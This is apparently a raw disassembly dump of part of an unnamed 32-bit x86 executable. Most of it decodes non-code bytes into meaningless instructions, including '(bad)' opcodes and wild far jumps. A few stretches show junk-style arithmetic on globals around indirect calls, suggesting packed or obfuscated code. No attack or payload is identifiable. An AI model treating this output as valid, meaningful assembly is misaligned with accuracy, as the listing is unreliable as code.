  402aee:	add    ecx,DWORD PTR [edx-0x750de5c1]
  402af4:	dec    eax
  402af5:	jnp    0x402b3a
  402af7:	or     dl,BYTE PTR [eax-0x72da892]
  402afd:	xor    BYTE PTR [eax+0x7d],ah
  402b00:	adc    BYTE PTR [ecx-0x76],al
  402b03:	and    DWORD PTR [esi+0x56],0xd36ffda1
  402b0a:	push   cs
  402b0b:	dec    esi
  402b0c:	pop    esp
  402b0d:	mov    dh,0x48
  402b0f:	adc    BYTE PTR [ebx+0x76470500],dh
  402b15:	leave  
  402b16:	jno    0x402b30
  402b18:	xor    DWORD PTR ds:0xd21c9325,ebp
  402b1e:	nop
  402b1f:	push   ss
  402b20:	adc    al,0xd
  402b22:	retf   
  402b23:	push   0xffffffd2
  402b25:	scas   al,BYTE PTR es:[edi]
  402b26:	jecxz  0x402aec
  402b28:	lock mov ebx,0xb0d2ddba
  402b2e:	add    esp,edi
  402b30:	repz test al,0xea
  402b33:	daa    
  402b34:	xchg   esi,eax
  402b35:	fnstcw WORD PTR [esi+0x31]
  402b38:	int    0x3d
  402b3a:	cdq    
  402b3b:	cmp    dh,BYTE PTR [edi]
  402b3d:	mov    bl,0xb6
  402b3f:	sahf   
  402b40:	fistp  QWORD PTR [esi-0x777093a5]
  402b46:	jmp    FWORD PTR [edx+0x30f45b6a]
  402b4c:	je     0x402ae6
  402b4e:	and    BYTE PTR [edi-0x61],bl
  402b51:	xlat   BYTE PTR ds:[ebx]
  402b52:	xor    BYTE PTR [edi-0x75],al
  402b55:	add    ecx,edx
  402b57:	test   eax,0x93dcf63e
  402b5c:	in     eax,0xa
  402b5e:	fwait
  402b5f:	and    al,0xc0
  402b61:	aas    
  402b62:	in     eax,0x26
  402b64:	dec    eax
  402b65:	test   eax,0x921d6607
  402b6a:	push   ecx
  402b6b:	push   eax
  402b6c:	push   0xddf
  402b71:	sbb    DWORD PTR ds:0x4283f7,0x41e0
  402b7b:	push   0x2d0f
  402b80:	call   0x4220c5
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x4282e3,0x0
  402b94:	mov    edx,DWORD PTR ds:0x4283f7
  402b9a:	mov    DWORD PTR ds:0x4281ef,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428293
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42836b,ebx
  402bb6:	cmp    DWORD PTR ds:0x4282e3,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428de4
  402bcc:	mov    edx,DWORD PTR ds:0x4282f3
  402bd2:	add    DWORD PTR ds:0x4282cb,edx
  402bd8:	mov    DWORD PTR ds:0x42836f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x4282ab
  402be8:	mov    edx,DWORD PTR ds:0x42837b
  402bee:	sbb    DWORD PTR ds:0x428307,edx
  402bf4:	mov    edx,DWORD PTR ds:0x4282c3
  402bfa:	xor    DWORD PTR ds:0x428387,edx
  402c00:	and    edx,DWORD PTR ds:0x42835f
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42828b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x428233
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x4282bb,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x4225e8
  402c34:	or     DWORD PTR ds:0x4281b3,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x42835b,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x4283ef,0x4283cb
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [edi+ebp*8+0x17],0xffffff89
  402c79:	jl     0x402c31
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [esi],ah
  402c83:	call   0x52f20b59
  402c88:	es xor al,0xac
  402c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c8c:	pop    ds
  402c8d:	sbb    ebp,ebx
  402c8f:	pop    ss
  402c90:	cmp    al,0xa3
  402c92:	sbb    eax,0xc25c2ac8
  402c97:	pop    ebx
  402c98:	aam    0x24
  402c9a:	push   eax
  402c9b:	mov    ecx,ebx
  402c9d:	xchg   esi,eax
  402c9e:	test   al,0x45
  402ca0:	cli    
  402ca1:	sar    BYTE PTR [eax-0x66],0xd8
  402ca5:	dec    ecx
  402ca6:	or     esi,DWORD PTR [ebx]
  402ca8:	scas   al,BYTE PTR es:[edi]
  402ca9:	jp     0x402c2b
  402cab:	pop    es
  402cac:	inc    ecx
  402cad:	mov    dh,0x1a
  402caf:	cmp    eax,0x330dc6f
  402cb4:	pop    ds
  402cb5:	iret   
  402cb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb7:	jne    0x402ce0
  402cb9:	push   0x1c
  402cbb:	jp     0x402c77
  402cbd:	aad    0x7b
  402cbf:	iret   
  402cc0:	mov    al,0x26
  402cc2:	ja     0x402cbb
  402cc4:	pop    esi
  402cc5:	add    DWORD PTR [ecx-0x7dbf6b77],ebx
  402ccb:	scas   al,BYTE PTR es:[edi]
  402ccc:	sti    
  402ccd:	clc    
  402cce:	ss sbb eax,0x308878b2
  402cd4:	ja     0x402d21
  402cd6:	inc    esp
  402cd7:	lods   eax,DWORD PTR ds:[esi]
  402cd8:	jbe    0x402ca3
  402cda:	ror    BYTE PTR [edx+0x16],1
  402cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cde:	or     ebp,edx
  402ce0:	sahf   
  402ce1:	sub    eax,0xb7bda25c
  402ce6:	push   edi
  402ce7:	sub    ecx,esi
  402ce9:	inc    esp
  402cea:	fcom   QWORD PTR [eax-0x65a4db47]
  402cf0:	jmp    0x402c8a
  402cf2:	das    
  402cf3:	add    ch,BYTE PTR [eax]
  402cf5:	call   0x12b004ca
  402cfa:	cwde   
  402cfb:	inc    ebp
  402cfc:	out    dx,al
  402cfd:	sbb    ah,BYTE PTR [ebx-0x2d]
  402d00:	enter  0x6865,0x1
  402d04:	jo     0x402c8c
  402d06:	and    cl,BYTE PTR [ecx-0x6873aa0]
  402d0c:	jnp    0x402cb1
  402d0e:	jmp    0x68c1:0x6f06e99c
  402d15:	jns    0x402d89
  402d17:	xor    eax,0x523e1532
  402d1c:	pusha  
  402d1d:	arpl   WORD PTR [edi],sp
  402d1f:	jo     0x402d97
  402d21:	inc    eax
  402d22:	jb     0x402cd0
  402d24:	jnp    0x402d71
  402d26:	outs   dx,BYTE PTR ds:[esi]
  402d27:	dec    ecx
  402d28:	jp     0x402d28
  402d2a:	ins    DWORD PTR es:[edi],dx
  402d2b:	stos   DWORD PTR es:[edi],eax
  402d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d2d:	loopne 0x402d00
  402d2f:	sbb    DWORD PTR [ebp+ebp*2+0x42],esi
  402d33:	dec    esp
  402d34:	or     DWORD PTR [esi-0xa3cdb54],ecx
  402d3a:	ror    DWORD PTR [eax],0x8e
  402d3d:	dec    ebx
  402d3e:	cmp    DWORD PTR ds:0xc3844216,esp
  402d44:	sub    eax,DWORD PTR [eax+0x52]
  402d47:	xor    edx,ebp
  402d49:	pop    ss
  402d4a:	outs   dx,BYTE PTR ds:[esi]
  402d4b:	cld    
  402d4c:	cli    
  402d4d:	mov    ds:0x5fad2e23,eax
  402d52:	push   edx
  402d53:	cmp    eax,0x906fb4a2
  402d58:	jmp    0xeee60d70
  402d5d:	inc    ecx
  402d5e:	or     al,0xb
  402d60:	push   ecx
  402d61:	jb     0x402cf8
  402d63:	mov    al,ds:0xffbff867
  402d68:	out    dx,eax
  402d69:	jae    0x402d25
  402d6b:	mov    edx,DWORD PTR [edx-0x4b]
  402d6e:	outs   dx,BYTE PTR ds:[esi]
  402d6f:	and    BYTE PTR [ecx-0x80],dh
  402d72:	pop    ecx
  402d73:	sti    
  402d74:	(bad)  
  402d75:	jmp    0x949a8f9d
  402d7a:	sub    eax,0x14514604
  402d7f:	and    DWORD PTR [ebp+0x2d],esi
  402d82:	lods   eax,DWORD PTR ds:[esi]
  402d83:	mov    esi,0xd0219681
  402d88:	test   ch,cl
  402d8a:	pop    ds
  402d8b:	mov    esp,0x4230cbd8
  402d90:	push   eax
  402d91:	test   al,0xcf
  402d93:	shl    DWORD PTR [ebx-0x11],cl
  402d96:	fs push esi
  402d98:	dec    esi
  402d99:	add    eax,DWORD PTR [edx+0x2]
  402d9c:	add    al,0xb4
  402d9e:	retf   0x2321
  402da1:	ins    BYTE PTR es:[edi],dx
  402da2:	dec    eax
  402da3:	dec    ebp
  402da4:	adc    DWORD PTR [ecx-0xd9c2717],edx
  402daa:	mov    dl,0x2f
  402dac:	les    eax,FWORD PTR [bx+0x4d]
  402db0:	enter  0xef79,0xfc
  402db4:	inc    edi
  402db5:	sub    eax,0x8df610fe
  402dba:	push   cs
  402dbb:	(bad)  
  402dbc:	xor    cl,ah
  402dbe:	(bad)  
  402dbf:	fwait
  402dc0:	popa   
  402dc1:	jo     0x402d5c
  402dc3:	adc    cl,BYTE PTR [eax]
  402dc5:	loop   0x402e08
  402dc7:	js     0x402e32
  402dc9:	imul   edi,DWORD PTR ds:0x2db1f5d,0x9a410ee7
  402dd3:	test   al,0xe5
  402dd5:	sub    esi,DWORD PTR [esi]
  402dd7:	xor    ebx,DWORD PTR [esi-0x17]
  402dda:	popf   
  402ddb:	jge    0x402dd8
  402ddd:	nop
  402dde:	mov    DWORD PTR [ecx-0x71],edx
  402de1:	and    esp,edi
  402de3:	and    ebp,esi
  402de5:	mov    edx,0x478381e4
  402dea:	pusha  
  402deb:	fisttp QWORD PTR [esi-0x5406863f]
  402df1:	ss xchg edx,eax
  402df3:	push   edi
  402df4:	iret   
  402df5:	aad    0x82
  402df7:	into   
  402df8:	in     al,dx
  402df9:	sar    BYTE PTR ds:0x36c4b2c6,1
  402dff:	popa   
  402e00:	push   ebx
  402e01:	daa    
  402e02:	lds    ecx,FWORD PTR [edi]
  402e04:	int    0xe4
  402e06:	push   cs
  402e07:	dec    ecx
  402e08:	or     eax,0x128b273f
  402e0d:	mov    eax,0x409e73df
  402e12:	pop    ss
  402e13:	dec    esi
  402e14:	cwde   
  402e15:	mov    ah,0x23
  402e17:	out    dx,eax
  402e18:	arpl   WORD PTR [ebx-0x8d1a342],si
  402e1e:	inc    ebx
  402e1f:	mov    dh,0x86
  402e21:	lods   al,BYTE PTR ds:[esi]
  402e22:	sti    
  402e23:	stc    
  402e24:	test   DWORD PTR ds:[ebx],ecx
  402e27:	pushf  
  402e28:	shl    BYTE PTR [edx-0x5bb1d048],0xcd
  402e2f:	popa   
  402e30:	popa   
  402e31:	iret   
  402e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e33:	xchg   esp,eax
  402e34:	scas   al,BYTE PTR es:[edi]
  402e35:	pop    ebx
  402e36:	stos   BYTE PTR es:[edi],al
  402e37:	sbb    BYTE PTR [ecx+0x6b],ah
  402e3a:	ja     0x402ea2
  402e3c:	push   0xffffffca
  402e3e:	cmp    ecx,DWORD PTR [esi+0xe36c241]
  402e44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e45:	imul   ebx,ebx,0xffffffd6
  402e48:	not    BYTE PTR [eax-0x2fd5e558]
  402e4e:	dec    esp
  402e4f:	pop    ebx
  402e50:	std    
  402e51:	add    ecx,DWORD PTR fs:[edi]
  402e54:	cmc    
  402e55:	cli    
  402e56:	(bad)
  402e5a:	fwait
  402e5b:	jmp    0x402e96
  402e5d:	sbb    esp,ecx
  402e5f:	outs   dx,DWORD PTR ds:[esi]
  402e60:	adc    cl,al
  402e62:	mov    ecx,0x2362fc47
  402e67:	gs dec ebx
  402e69:	dec    ebp
  402e6a:	scas   eax,DWORD PTR es:[edi]
  402e6b:	fmul   DWORD PTR [ecx]
  402e6d:	fst    QWORD PTR [edx+0x74]
  402e70:	leave  
  402e71:	lods   eax,DWORD PTR ds:[esi]
  402e72:	pop    es
  402e73:	nop
  402e74:	or     edx,DWORD PTR [ebx-0x7fd43c88]
  402e7a:	xor    al,0xf0
  402e7c:	dec    edx
  402e7d:	gs jmp 0xa955adb
  402e83:	jb     0x402e0d
  402e85:	fwait
  402e86:	and    BYTE PTR [ebp-0x21d7b646],al
  402e8c:	cwde   
  402e8d:	jmp    0xe2e2d8e
  402e92:	mov    WORD PTR [ecx+0xbfe192e],es
  402e98:	mov    ebx,0x36e245f0
  402e9d:	pop    ebx
  402e9e:	jb     0x402e31
  402ea0:	fist   DWORD PTR [edx+esi*4]
  402ea3:	xchg   ecx,eax
  402ea4:	xchg   esi,eax
  402ea5:	jb     0x402e28
  402ea7:	rol    BYTE PTR [esi-0x59],1
  402eaa:	inc    esp
  402eab:	stos   DWORD PTR es:[edi],eax
  402eac:	aaa    
  402ead:	jmp    0xaf5ae112
  402eb2:	jl     0x402e96
  402eb4:	rol    cl,0x47
  402eb7:	jge    0x402e59
  402eb9:	adc    DWORD PTR [esi+0x7b0f8aaa],eax
  402ebf:	mov    ecx,0xd38a73b4
  402ec4:	pushf  
  402ec5:	sbb    eax,0x73542414
  402eca:	out    dx,al
  402ecb:	in     eax,0xcb
  402ecd:	jge    0x402ea2
  402ecf:	inc    edx
  402ed0:	fisttp WORD PTR [ebp-0x75]
  402ed3:	shr    cl,cl
  402ed5:	cdq    
  402ed6:	jge    0x402eda
  402ed8:	sbb    BYTE PTR [edx+0x23333de3],bh
  402ede:	xchg   DWORD PTR [esi],esp
  402ee0:	mov    eax,0xaf99c44a
  402ee5:	mov    ecx,edx
  402ee7:	cs xchg edx,eax
  402ee9:	sbb    ch,BYTE PTR [eax+edx*1-0x14ff35cd]
  402ef0:	ds xchg ebp,eax
  402ef2:	xor    BYTE PTR [esi+0x3e4776ce],0xd6
  402ef9:	inc    ebp
  402efa:	stc    
  402efb:	aam    0x3
  402efd:	imul   DWORD PTR [ebp+0x6462a982]
  402f03:	mov    esp,DWORD PTR [esi-0x2]
  402f06:	sahf   
  402f07:	xchg   edi,eax
  402f08:	jnp    0x402eaa
  402f0a:	aaa    
  402f0b:	fdiv   st(6),st
  402f0d:	loopne 0x402f3a
  402f0f:	xor    DWORD PTR [edx+0x66],eax
  402f12:	and    eax,0x21bfe50e
  402f17:	push   ebx
  402f18:	or     BYTE PTR [edx-0x51],ah
  402f1b:	mov    esp,DWORD PTR [ecx]
  402f1d:	lock rep outs dx,BYTE PTR ds:[esi]
  402f20:	xlat   BYTE PTR ds:[ebx]
  402f21:	cmp    eax,0x1b8b8452
  402f26:	dec    ecx
  402f27:	and    BYTE PTR ds:0xc4714044,ah
  402f2d:	push   0xa4243fd3
  402f32:	(bad)  
  402f33:	xor    al,0x91
  402f35:	xchg   esi,eax
  402f36:	pop    es
  402f37:	pop    es
  402f38:	push   ebp
  402f39:	pop    esp
  402f3a:	push   0xffffffce
  402f3c:	sub    esp,DWORD PTR [ebx-0x1966bab4]
  402f42:	pop    eax
  402f43:	xlat   BYTE PTR ds:[ebx]
  402f44:	ja     0x402ed1
  402f46:	in     al,dx
  402f47:	sub    BYTE PTR [ebx+0xcd91983],dl
  402f4d:	test   DWORD PTR [ecx+0x4d0d1beb],ecx
  402f53:	and    ebp,ebp
  402f55:	or     ecx,DWORD PTR [ebx-0x3f9bba49]
  402f5b:	mov    esp,0xa4e94f9c
  402f60:	(bad)  
  402f61:	pushf  
  402f62:	dec    edx
  402f63:	jg     0x402fa0
  402f65:	pop    edi
  402f66:	pop    ecx
  402f67:	dec    edx
  402f68:	xlat   BYTE PTR ds:[ebx]
  402f69:	mov    eax,ds:0x3906f52
  402f6e:	loop   0x402fc2
  402f70:	pushf  
  402f71:	shr    dh,cl
  402f73:	imul   esp,DWORD PTR [eax],0xfed20cca
  402f79:	scas   al,BYTE PTR es:[edi]
  402f7a:	pushf  
  402f7b:	dec    edi
  402f7c:	test   al,0x8c
  402f7e:	(bad)  
  402f7f:	mov    edi,0x86f9ae0
  402f84:	call   0x873f:0xa2dd3787
  402f8b:	test   cl,dl
  402f8d:	test   eax,0xc79c9797
  402f92:	push   ss
  402f93:	or     BYTE PTR [esi-0x4db7fa80],dl
  402f99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f9a:	fld    QWORD PTR [esi+ecx*4-0x67]
  402f9e:	sbb    BYTE PTR [edx],al
  402fa0:	pop    edi
  402fa1:	mov    dh,0x72
  402fa3:	test   DWORD PTR [edx+eax*8],edx
  402fa6:	pop    ecx
  402fa7:	jmp    0x1c91d866
  402fac:	pop    edx
  402fad:	add    ah,al
  402faf:	jle    0x402f8f
  402fb1:	sahf   
  402fb2:	xor    BYTE PTR [esi+0x14],al
  402fb5:	ret    
  402fb6:	cmp    BYTE PTR es:[esi+0xb],bh
  402fba:	adc    al,0x4d
  402fbc:	jl     0x402f97
  402fbe:	cmp    cl,dl
  402fc0:	mov    edi,0x5b787e20
  402fc5:	jmp    0x402f80
  402fc7:	jb     0x40301a
  402fc9:	xchg   ebx,ebx
  402fcb:	cmp    eax,0x9c892bb4
  402fd0:	jmp    0x403040
  402fd2:	mov    BYTE PTR [eax-0x7cf16988],al
  402fd8:	call   0x59ef:0x9894d31a
  402fdf:	dec    esi
  402fe0:	pop    ss
  402fe1:	sbb    DWORD PTR [ecx+0x473e1f27],esi
  402fe7:	out    0xc9,eax
  402fe9:	imul   ecx,DWORD PTR [edx+ecx*8],0xffffff91
  402fed:	mov    bh,0xa
  402fef:	sbb    DWORD PTR [eax],eax
  402ff1:	mov    ecx,0x162fea43
  402ff6:	cmp    DWORD PTR [ecx],esp
  402ff8:	mov    ch,0x17
  402ffa:	data16 stc 
  402ffc:	push   0x20
  402ffe:	(bad)  
  402fff:	popf   
  403000:	mov    ds:0x47000e10,eax
  403005:	cmp    DWORD PTR [edx-0x19],edx
  403008:	lahf   
  403009:	bnd jns 0x40303a
  40300c:	inc    esp
  40300d:	xchg   esp,eax
  40300e:	retf   
  40300f:	or     BYTE PTR [edi-0x27],dl
  403012:	ss stos DWORD PTR es:[edi],eax
  403014:	push   DWORD PTR [edx]
  403016:	dec    ebx
  403017:	fild   WORD PTR [ebp+0x1ade37c4]
  40301d:	jo     0x402fd9
  40301f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403020:	inc    esp
  403021:	dec    ebp
  403022:	and    dl,BYTE PTR [edi-0x45a91c5b]
  403028:	mov    edi,0x922fcf63
  40302d:	in     al,dx
  40302e:	push   esi
  40302f:	xor    al,BYTE PTR es:[ebp-0x17ca6576]
  403036:	sub    al,0x8b
  403038:	pop    edi
  403039:	adc    BYTE PTR [edi+0x16],bh
  40303c:	outs   dx,DWORD PTR ds:[esi]
  40303d:	shr    BYTE PTR [ebp-0x8],1
  403040:	or     cl,BYTE PTR [eax-0x3f]
  403043:	and    ecx,edx
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x4282fb,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x4283ff,0x0
  403071:	mov    DWORD PTR ds:0x428403,edx
  403077:	mov    DWORD PTR ds:0x42834b,0x1413
  403081:	mov    edx,DWORD PTR ds:0x4283f3
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x4281bf,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x4283ff,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428e04
  4030b1:	mov    DWORD PTR ds:0x4282ab,0x4e29
  4030bb:	inc    DWORD PTR ds:0x4282cf
  4030c1:	or     edx,DWORD PTR ds:0x42836b
  4030c7:	add    edx,DWORD PTR ds:0x4281ef
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x4283f7,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42837f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x4283e3
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x428403,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x4281bb
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x428407,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x403111
  403121:	adc    al,0x73
  403123:	jl     0x403162
  403125:	in     al,dx
  403126:	sbb    BYTE PTR [eax],bl
  403128:	sahf   
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    BYTE PTR [esi],bl
  40312d:	in     eax,dx
  40312e:	test   esi,ebx
  403130:	jmp    0xebff:0x96b68e5b
  403137:	fdivp  st(0),st
  403139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40313a:	shr    DWORD PTR [eax-0x37],0x96
  40313e:	rcl    BYTE PTR [edi-0x785a45a5],0x28
  403145:	popa   
  403146:	sub    al,0xba
  403148:	mov    ah,0x97
  40314a:	mov    edi,0x87ef0aa4
  40314f:	sub    DWORD PTR [edx+0x7e],esp
  403152:	setge  BYTE PTR [esi]
  403155:	cmp    ecx,DWORD PTR ds:0xb13fbd5e
  40315b:	imul   esp,DWORD PTR [ecx+0x1f],0xe7acaecc
  403162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403164:	mov    ebx,0x397fe8ec
  403169:	shl    dl,1
  40316b:	push   ebp
  40316c:	cmp    eax,0x81b2daf2
  403171:	ret    
  403172:	push   eax
  403173:	dec    ebp
  403174:	pop    edx
  403175:	sbb    BYTE PTR [ebp+0x5aeb676f],dh
  40317b:	xor    esi,ebx
  40317d:	add    DWORD PTR ds:0xaff15109,esp
  403183:	repnz (bad) 
  403185:	out    0x15,eax
  403187:	stos   BYTE PTR es:[edi],al
  403188:	jne    0x403161
  40318a:	shr    DWORD PTR [eax+0x73213ffa],0xaa
  403191:	pop    eax
  403192:	sahf   
  403193:	xchg   ebx,eax
  403194:	push   0x1
  403196:	add    ebx,DWORD PTR [ecx-0x6a]
  403199:	js     0x40312e
  40319b:	jmp    0x3ab1c2eb
  4031a0:	jbe    0x4031e1
  4031a2:	adc    al,0xfd
  4031a4:	ins    DWORD PTR es:[edi],dx
  4031a5:	or     DWORD PTR [esi],0xffffffce
  4031a8:	sbb    al,0x71
  4031aa:	in     al,0x8f
  4031ac:	xchg   BYTE PTR [esp+eax*2+0x3f],bl
  4031b0:	sbb    esp,DWORD PTR [ecx]
  4031b2:	push   ebp
  4031b3:	pop    ss
  4031b4:	jb     0x4031f2
  4031b6:	lahf   
  4031b7:	mov    edx,0xfd175540
  4031bc:	cmc    
  4031bd:	sbb    ch,ch
  4031bf:	inc    ecx
  4031c0:	dec    eax
  4031c1:	aam    0xab
  4031c3:	or     ah,BYTE PTR [ebx-0x64]
  4031c6:	sub    BYTE PTR [ecx+0x9],bh
  4031c9:	outs   dx,BYTE PTR ds:[esi]
  4031ca:	push   edx
  4031cb:	and    eax,0x77acbd21
  4031d0:	and    ch,BYTE PTR [bp-0x2236]
  4031d5:	pop    ebp
  4031d6:	test   DWORD PTR [edx-0x646d305c],eax
  4031dc:	fidivr DWORD PTR [eax-0x3a]
  4031df:	mov    ds:0x6970d6b9,eax
  4031e4:	(bad)  
  4031e5:	and    eax,0x347bc2b9
  4031ea:	xchg   DWORD PTR [esi-0x5d4a63b6],edx
  4031f0:	shr    DWORD PTR [ecx+0x34],0x68
  4031f4:	push   eax
  4031f5:	mov    WORD PTR [esi-0x33],fs
  4031f8:	daa    
  4031f9:	cmp    ecx,ebx
  4031fb:	mov    dl,0x9e
  4031fd:	out    0x92,al
  4031ff:	out    dx,al
  403200:	(bad)  
  403201:	jp     0x4031d3
  403203:	or     BYTE PTR [esi-0x37],al
  403206:	pop    ss
  403207:	ret    
  403208:	sbb    eax,0x2e204911
  40320d:	bound  esi,QWORD PTR [eax+0x62b4b90e]
  403213:	push   ds
  403214:	xchg   edx,eax
  403215:	mov    al,ds:0xaeca7407
  40321a:	mov    es,WORD PTR [edx]
  40321c:	test   al,0x37
  40321e:	or     bl,bh
  403220:	cld    
  403221:	jbe    0x403289
  403223:	sbb    BYTE PTR [eax],ah
  403225:	or     dl,BYTE PTR [ebx+ecx*8]
  403228:	and    cl,BYTE PTR [edx-0x1baf1d52]
  40322e:	scas   eax,DWORD PTR es:[edi]
  40322f:	sub    DWORD PTR [edi-0x66383fd],0xffffffbc
  403236:	aas    
  403237:	jge    0x403255
  403239:	xchg   esi,eax
  40323a:	mov    edx,0xd72ba140
  40323f:	loop   0x40323e
  403241:	sub    eax,DWORD PTR [edi-0x3318939a]
  403247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403248:	mov    ds:0x1769a0fd,eax
  40324d:	mov    cl,BYTE PTR [eax+edx*8-0x63]
  403251:	xchg   ecx,eax
  403253:	popa   
  403254:	add    DWORD PTR [ebx-0x7b],edx
  403257:	test   eax,0x753afd5e
  40325c:	lds    edx,FWORD PTR [ebp+0x77bce89b]
  403262:	mov    dl,0x35
  403264:	add    eax,0xcde4fa40
  403269:	xchg   esi,eax
  40326a:	jnp    0x4032aa
  40326c:	push   ecx
  40326d:	push   0xffffff99
  40326f:	mov    ecx,0x52fb11cf
  403274:	sbb    edx,DWORD PTR ds:0x3bbcabd1
  40327a:	cwde   
  40327b:	jl     0x40323d
  40327d:	xor    dh,BYTE PTR [ebp+0x3abff14f]
  403283:	pop    edx
  403284:	std    
  403285:	mov    edi,0x88de4a6a
  40328a:	aad    0xde
  40328c:	xor    ch,BYTE PTR [edi+0x7037776e]
  403292:	sti    
  403293:	xlat   BYTE PTR ds:[ebx]
  403294:	popf   
  403295:	cli    
  403296:	pop    ecx
  403297:	imul   esi,edi,0x48
  40329a:	jmp    0x403227
  40329c:	pushf  
  40329d:	xchg   DWORD PTR [edi],edx
  40329f:	xchg   edi,eax
  4032a0:	scas   al,BYTE PTR es:[edi]
  4032a1:	jl     0x4032b3
  4032a3:	mov    al,0xae
  4032a5:	mov    ds:0xbd914c5a,eax
  4032aa:	loop   0x4032ef
  4032ac:	sbb    BYTE PTR [eax-0x78],dh
  4032af:	in     al,dx
  4032b0:	pop    ebp
  4032b1:	mov    ch,0x77
  4032b3:	aas    
  4032b4:	je     0x40327e
  4032b6:	fadd   st,st(2)
  4032b8:	repz xchg esi,eax
  4032ba:	lds    edx,FWORD PTR [ecx]
  4032bc:	shr    BYTE PTR [ebp+0x31],cl
  4032bf:	mov    cl,0xe7
  4032c1:	pop    es
  4032c2:	push   0xf6f4a2e4
  4032c7:	xor    al,0x3f
  4032c9:	xor    BYTE PTR [ebp+eax*4-0x4757cfbb],dh
  4032d0:	inc    edi
  4032d1:	(bad)  
  4032d2:	xor    eax,0x5fa33aac
  4032d7:	dec    ebx
  4032d8:	das    
  4032d9:	pop    es
  4032da:	out    dx,eax
  4032db:	lahf   
  4032dc:	add    DWORD PTR [edi+ecx*4+0x7fda2653],esp
  4032e3:	or     DWORD PTR [ecx],esi
  4032e5:	sub    esi,esp
  4032e7:	inc    esi
  4032e8:	xchg   esp,eax
  4032e9:	pop    es
  4032ea:	arpl   WORD PTR [eax-0x419f84c9],di
  4032f0:	push   ecx
  4032f1:	add    DWORD PTR [ebp-0x7a5da47d],esp
  4032f7:	inc    esi
  4032f8:	xor    ecx,DWORD PTR [edi-0x27]
  4032fb:	pusha  
  4032fc:	std    
  4032fd:	adc    dh,al
  4032ff:	mov    ch,0x58
  403301:	or     BYTE PTR [eax-0x63aa7920],dl
  403307:	adc    eax,0xb6bff4bf
  40330c:	and    BYTE PTR ds:0xbbc2766c,al
  403312:	mov    edx,0x463aba99
  403317:	mov    edx,0x23e6140
  40331c:	out    dx,al
  40331d:	xlat   BYTE PTR ds:[ebx]
  40331e:	data16 jb 0x403369
  403321:	lods   eax,DWORD PTR ds:[esi]
  403322:	dec    edi
  403323:	test   DWORD PTR ds:0x39855638,eax
  403329:	test   eax,0xf5e4005a
  40332e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40332f:	sbb    eax,0x8a3ac059
  403334:	popf   
  403335:	add    ecx,edx
  403337:	inc    esi
  403338:	jmp    0x9963:0x947d65c8
  40333f:	xchg   edi,eax
